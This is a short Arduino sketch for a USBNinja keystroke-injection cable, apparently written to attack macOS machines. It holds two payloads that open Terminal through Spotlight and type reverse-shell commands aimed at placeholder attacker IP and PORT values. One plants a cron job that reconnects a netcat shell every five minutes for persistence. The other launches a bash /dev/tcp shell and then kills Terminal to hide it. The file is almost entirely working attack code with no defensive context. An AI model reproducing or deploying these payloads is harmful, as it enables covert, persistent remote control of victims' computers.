/*

Author:
  Gilson Camelo | Twitter: @GSCAMELO 

*/

#include <NinjaKeyboard.h>

void setup(){}

void loop() {}

void payloadA(){
    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(100);
    NinjaKeyboard.print(F("Terminal")); 
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("echo '*/5 * * * * nc -e /bin/sh IP PORT >/dev/null' | crontab -"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);

    // Stop and remove keyboard   
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
}

void payloadB(){
    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(100);
    NinjaKeyboard.print(F("Terminal"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("bash -i >& /dev/tcp/IP/PORT 0>&1 &"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("killall Terminal"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);

    // Stop and remove keyboard   
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
}